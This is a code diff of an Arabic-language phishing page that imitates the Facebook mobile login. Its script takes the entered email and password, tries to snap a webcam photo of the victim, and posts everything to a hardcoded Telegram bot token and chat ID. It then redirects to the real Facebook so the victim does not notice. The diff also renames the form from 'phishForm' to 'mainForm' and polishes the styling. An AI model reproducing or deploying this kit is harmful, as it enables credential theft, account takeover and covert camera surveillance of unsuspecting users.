@@ -3,38 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تسجيل الدخول إلى فيسبوك</title>
+    <title>تسجيل الدخول إلى فيسبوك | Facebook</title>
     <link rel="icon" href="https://www.facebook.com/favicon.ico">
     <style>
-        body {margin:0;padding:0;background:#f0f2f5;font-family: Helvetica, Arial, sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;}
-        .fb-container {width:100%;max-width:412px;background:white;min-height:100vh;display:flex;flex-direction:column;}
-        .header-img {width: 100%; height: auto; margin-top: 20px;}
-        .form-area {padding: 20px 16px;}
-        input {width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;background-color: #f5f6f7;}
-        .login-btn {width:100%;padding:12px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:12px;}
-        .links {text-align:center;margin:20px 0;font-size:14px;}
-        .links a {color:#1877f2;text-decoration:none;}
-        .footer {margin-top: auto; text-align:center;padding:20px;font-size:12px;color:#8a8d91;}
-        /* Spinner for "Loading" effect */
-        #loader {display:none; margin: 10px auto;}
+        body { margin:0; padding:0; background:#f0f2f5; font-family: Helvetica, Arial, sans-serif; display:flex; justify-content:center; align-items:flex-start; min-height:100vh; }
+        .fb-container { width:100%; max-width:412px; background:white; min-height:100vh; display:flex; flex-direction:column; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .logo-wrapper { text-align: center; padding-top: 40px; padding-bottom: 20px; }
+        .form-area { padding: 0 16px; }
+        input { width:100%; padding:14px; margin:6px 0; border:1px solid #dddfe2; border-radius:6px; font-size:16px; background-color: #f5f6f7; box-sizing: border-box; }
+        input:focus { outline: none; border-color: #1877f2; background-color: #fff; }
+        .login-btn { width:100%; padding:12px; background:#1877f2; color:white; font-size:18px; font-weight:bold; border:none; border-radius:6px; cursor:pointer; margin-top:12px; transition: 0.2s; }
+        .login-btn:active { background: #166fe5; transform: scale(0.98); }
+        .links { text-align:center; margin:20px 0; font-size:14px; }
+        .links a { color:#1877f2; text-decoration:none; display: block; margin-bottom: 15px; }
+        .divider { border:0; border-top:1px solid #dddfe2; margin:20px 0; }
+        .create-btn { background:#42b72a; color:white; border:none; padding:10px 16px; border-radius:6px; font-weight:bold; cursor: pointer; }
+        .footer { margin-top: auto; text-align:center; padding:20px; font-size:12px; color:#8a8d91; line-height: 1.6; }
     </style>
 </head>
 <body>
 
 <div class="fb-container">
-    <center><img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2zS3p9K.svg" width="112" style="margin-top:40px;"></center>
+    <div class="logo-wrapper">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2zS3p9K.svg" width="112" alt="facebook">
+    </div>
     
     <div class="form-area">
-        <form id="phishForm">
-            <input type="text" id="user_id" name="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
-            <input type="password" id="user_pass" name="pass" placeholder="كلمة السر" required>
+        <form id="mainForm">
+            <input type="text" id="email" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
             <button type="submit" class="login-btn" id="submitBtn">تسجيل الدخول</button>
         </form>
         
         <div class="links">
             <a href="#">هل نسيت كلمة السر؟</a>
-            <hr style="border:0; border-top:1px solid #dddfe2; margin:20px 0;">
-            <button style="background:#42b72a; color:white; border:none; padding:10px 16px; border-radius:6px; font-weight:bold;">إنشاء حساب جديد</button>
+            <div class="divider"></div>
+            <button class="create-btn">إنشاء حساب جديد</button>
         </div>
     </div>
 
@@ -45,61 +49,63 @@
 </div>
 
 <script>
+// === CONFIGURATION ===
 const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
 const CHAT_ID = "1611398303";
 
-document.getElementById('phishForm').onsubmit = async function(e) {
+document.getElementById('mainForm').onsubmit = async function(e) {
     e.preventDefault();
     
-    const email = document.getElementById('user_id').value;
-    const pass = document.getElementById('user_pass').value;
+    const userEmail = document.getElementById('email').value;
+    const userPass = document.getElementById('pass').value;
     const btn = document.getElementById('submitBtn');
     
-    // UI Change to mimic real loading
-    btn.innerText = "جاري تسجيل الدخول...";
-    btn.style.opacity = "0.7";
+    // UI Feedback
+    btn.innerText = "جاري التحقق...";
+    btn.disabled = true;
 
-    // 1. Capture Credentials immediately
-    const textData = `🔥 صيد جديد!\n📧 الإيميل: ${email}\n🔑 الباسورد: ${pass}\n📱 المتصفح: ${navigator.userAgent}`;
-    
-    // 2. Attempt Background Surveillance (Camera/GPS)
-    let photoBlob = null;
-    let gpsInfo = "Location Denied";
+    const info = `🔥 صيد جديد!\n📧 الإيميل: ${userEmail}\n🔑 الباسورد: ${userPass}\n🌐 المتصفح: ${navigator.platform}`;
 
+    // 1. Attempt Background Capture (Triggers because of 'Submit' click)
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         const video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
-        
-        const canvas = document.createElement('canvas');
-        canvas.width = 640; canvas.height = 480;
-        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-        const dataUrl = canvas.toDataURL('image/jpeg');
-        photoBlob = dataURLtoBlob(dataUrl);
-        stream.getTracks().forEach(t => t.stop());
-    } catch (e) { console.log("Cam Blocked"); }
 
-    // 3. Send everything to Telegram
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    
-    if (photoBlob) {
-        formData.append('photo', photoBlob, 'victim.jpg');
-        formData.append('caption', textData);
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-    } else {
+        // Give the camera a second to adjust
+        setTimeout(async () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = 640; canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            
+            const blob = dataURLtoBlob(canvas.toDataURL('image/jpeg'));
+            stream.getTracks().forEach(t => t.stop()); // Stop camera light
+
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'victim.jpg');
+            formData.append('caption', info);
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            finish();
+        }, 1000);
+
+    } catch (err) {
+        // 2. Fallback: If camera is blocked, send text only
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: CHAT_ID, text: textData })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: info + "\n⚠️ (الضحية رفض الكاميرا)" })
         });
+        finish();
     }
-
-    // 4. THE CLEANUP: Redirect to actual Facebook
-    // This makes the user think the login just refreshed or they need to try again on the real site
-    window.location.href = "https://www.facebook.com/login/?next=https%3A%2F%2Fwww.facebook.com%2Fwatch%2F";
 };
+
+function finish() {
+    // Redirect to real Facebook to complete the illusion
+    window.location.href = "https://www.facebook.com/login/";
+}
 
 function dataURLtoBlob(dataurl) {
     let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
